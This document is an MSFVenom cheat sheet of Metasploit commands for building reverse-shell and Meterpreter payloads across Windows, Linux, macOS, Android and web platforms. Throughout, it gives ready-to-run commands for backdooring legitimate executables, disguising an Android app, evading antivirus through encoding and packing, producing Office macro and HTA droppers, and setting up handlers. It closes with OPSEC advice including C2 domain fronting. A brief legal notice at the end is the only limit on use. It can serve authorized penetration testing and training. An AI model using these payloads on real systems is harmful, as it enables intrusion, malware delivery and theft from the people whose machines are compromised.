# MSFVenom Cheat Sheet

> **‚ö° Metasploit's Swiss Army Knife** for payload generation and encoding  
> *Replace `{LHOST}` with your IP and `{LPORT}` with your listening port*

---

## üîß Basic Syntax
```bash
msfvenom -p <PAYLOAD> LHOST={LHOST} LPORT={LPORT} -f <FORMAT> -o <OUTPUT>
```

---

## üì¶ Binary Payloads

### Windows
```bash
# Meterpreter Reverse TCP (Staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > payload.exe

# Meterpreter Reverse HTTP (Stealthier)
msfvenom -p windows/meterpreter/reverse_http LHOST={LHOST} LPORT={LPORT} -f exe > http.exe

# Non-Staged Shell (Smaller)
msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe

# 64-bit Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > x64_payload.exe
```

### Linux
```bash
# 32-bit Reverse Shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > payload.elf

# 64-bit Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > x64_payload.elf

# Meterpreter for Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > meterpreter.elf
```

### macOS
```bash
# macOS Reverse Shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho > shell.macho

# macOS Meterpreter
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho > meterpreter.macho
```

### Android
```bash
# Android APK Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o payload.apk

# Android with custom icon
msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} --icon /path/to/icon.png -o legit_app.apk
```

---

## üåê Web Payloads

### PHP
```bash
# Basic PHP Reverse Shell
msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw > shell.php

# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > meterpreter.php
```

### ASP/ASPX
```bash
# Classic ASP
msfvenom -p windows/shell/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp > shell.asp

# ASP.NET (ASPX)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx > shell.aspx
```

### Java
```bash
# JSP Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.jsp

# WAR File (Web Archive)
msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war

# Java JAR
msfvenom -p java/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f jar > shell.jar
```

### NodeJS
```bash
# NodeJS Reverse Shell
msfvenom -p nodejs/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.js
```

### Python
```bash
# Python Reverse Shell
msfvenom -p python/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.py

# Convert Python to EXE (requires PyInstaller)
pyinstaller --onefile --noconsole shell.py
```

---

## ‚öôÔ∏è Advanced Techniques

### List Available Options
```bash
# List all payloads
msfvenom --list payloads

# List encoders
msfvenom --list encoders

# List formats
msfvenom --list formats

# Show payload options
msfvenom --payload-options -p windows/meterpreter/reverse_tcp
```

### Backdoor Legitimate Executables
```bash
# Inject payload into existing EXE
msfvenom -x /path/to/clean.exe -k -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > backdoored.exe

# Template injection (preserves functionality)
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} --template /path/to/clean.exe -f exe > injected.exe
```

### Encoding for AV Evasion
```bash
# Single encoding with Shikata Ga Nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe

# Multiple encoders
msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -e x86/alpha_mixed -i 3 -f exe > multi_encoded.exe

# PowerShell Base64 encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -e cmd/powershell_base64 -i 3 -f psh > encoded.ps1
```

### Generate Shellcode
```bash
# C format shellcode
msfvenom -p windows/exec CMD="calc.exe" -f c

# Python format
msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f python

# Raw shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shellcode.bin
```

---

## üöÄ Payload Handlers

### Metasploit Handler Setup
```bash
# Start Metasploit
msfconsole

# Configure handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST {YOUR_IP}
msf6 exploit(multi/handler) > set LPORT {YOUR_PORT}
msf6 exploit(multi/handler) > run
```

### Advanced Handler Configuration
```bash
# Multiple sessions
msf6 exploit(multi/handler) > set ExitOnSession false

# Enable payload encoding
msf6 exploit(multi/handler) > set EnableStageEncoding true

# Set custom user agent (for HTTP payloads)
msf6 exploit(multi/handler) > set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

### Netcat Listeners (for simple shells)
```bash
# Basic netcat listener
nc -lvnp {LPORT}

# Netcat with verbose output
nc -lvnp {LPORT} -e /bin/bash
```

---

## üõ°Ô∏è Evasion Techniques

### Encoding Options
```bash
# Avoid bad characters
msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -b '\x00\xff\x0a\x0d' -f exe > clean.exe

# Add NOP sled
msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -n 200 -f exe > nop_payload.exe

# Custom iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -i 10 -f exe > heavily_encoded.exe
```

### Post-Generation Packing
```bash
# UPX packing (reduces size and obfuscates)
upx --best payload.exe -o packed.exe

# Verify packing
upx -t packed.exe
```

### Format-Specific Evasion
```bash
# PowerShell encoded payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f psh-cmd

# VBA macro for Office documents
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f vba

# HTA application
msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f hta-psh > payload.hta
```

---

## üìö Reference Tables

### Common Output Formats
| Format | Platform | Extension | Use Case |
|--------|----------|-----------|----------|
| `exe` | Windows | `.exe` | Standalone executable |
| `elf` | Linux | `.elf` | Linux binary |
| `macho` | macOS | `.macho` | macOS binary |
| `apk` | Android | `.apk` | Android application |
| `war` | Java Web | `.war` | Web application |
| `asp` | Windows Web | `.asp` | Classic ASP |
| `aspx` | Windows Web | `.aspx` | ASP.NET |
| `jsp` | Java Web | `.jsp` | Java Server Pages |
| `php` | Web | `.php` | PHP script |
| `py` | Cross-platform | `.py` | Python script |
| `ps1` | Windows | `.ps1` | PowerShell script |
| `hta` | Windows | `.hta` | HTML Application |
| `vba` | Office | `.vba` | VBA Macro |

### Top Encoders by Platform
| Encoder | Platform | Rank | Description |
|---------|----------|------|-------------|
| `x86/shikata_ga_nai` | Windows x86 | Excellent | Polymorphic XOR encoder |
| `x64/zutto_dekiru` | Windows x64 | Excellent | 64-bit XOR encoder |
| `cmd/powershell_base64` | Windows | Excellent | PowerShell Base64 |
| `x86/alpha_mixed` | Windows x86 | Good | Alphanumeric encoder |
| `ppc/longxor` | PowerPC | Good | XOR encoder for PPC |

### Payload Size Comparison
| Payload Type | Approximate Size | Notes |
|--------------|------------------|-------|
| Windows Meterpreter (staged) | ~1MB | Full-featured |
| Windows Shell (stageless) | ~150KB | Basic shell |
| Linux x86 Shell | ~100KB | Lightweight |
| PHP Reverse Shell | ~1KB | Web-based |
| PowerShell Payload | ~2KB | Fileless |

---

## üí° Pro Tips

### Payload Selection Strategy
- **Staged Payloads** (`meterpreter/reverse_tcp`):
  - ‚úÖ Smaller initial size
  - ‚úÖ Full Meterpreter features
  - ‚ùå Requires stable connection
  - ‚ùå Two-stage process detectable

- **Stageless Payloads** (`shell_reverse_tcp`):
  - ‚úÖ Self-contained
  - ‚úÖ Works with unstable connections
  - ‚ùå Larger file size
  - ‚ùå Limited functionality

### Port Selection for Evasion
```bash
# Common ports that bypass firewalls
LPORT=80    # HTTP
LPORT=443   # HTTPS
LPORT=53    # DNS
LPORT=22    # SSH
LPORT=21    # FTP
```

### Handler Optimization
```bash
# Persistent handler (doesn't exit after first session)
msf6 exploit(multi/handler) > set ExitOnSession false

# Auto-run post-exploitation modules
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate

# Enable payload staging encryption
msf6 exploit(multi/handler) > set EnableStageEncoding true
msf6 exploit(multi/handler) > set StageEncoder x86/shikata_ga_nai
```

### Debugging Failed Payloads
```bash
# Check payload requirements
msfvenom --payload-options -p windows/meterpreter/reverse_tcp

# Test connectivity
nc -lvnp {LPORT}  # On attacker machine
telnet {LHOST} {LPORT}  # From target machine

# Verify handler configuration
msf6 exploit(multi/handler) > show options
```

### OPSEC Considerations
1. **Avoid default ports** (4444, 4445)
2. **Use HTTPS payloads** for encrypted communication
3. **Consider payload signing** for Windows environments
4. **Test against target AV** before deployment
5. **Use staged payloads** for better evasion
6. **Implement domain fronting** for C2 traffic

---

## üîç Troubleshooting

### Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| Payload won't execute | AV detection | Use encoding/packing |
| No connection back | Firewall blocking | Try different ports |
| Handler not catching | Wrong payload type | Match handler to payload |
| Meterpreter crashes | Architecture mismatch | Use correct x86/x64 |
| Encoding fails | Bad characters | Specify `-b` parameter |

### Testing Your Payloads
```bash
# Test in isolated environment first
# Use VirusTotal for AV detection rates
# Verify functionality before deployment

# Quick payload test
msfvenom -p windows/exec CMD="calc.exe" -f exe > test.exe
```

---

**üìÖ Updated**: December 2024 | **üë§ Author**: Bilel G | **‚öñÔ∏è Legal Notice**: Use only on systems you own or have explicit permission to test

> **üõ°Ô∏è Ethical Hacking Reminder**: These tools are for authorized penetration testing, security research, and educational purposes only. Unauthorized access to computer systems is illegal and unethical.
```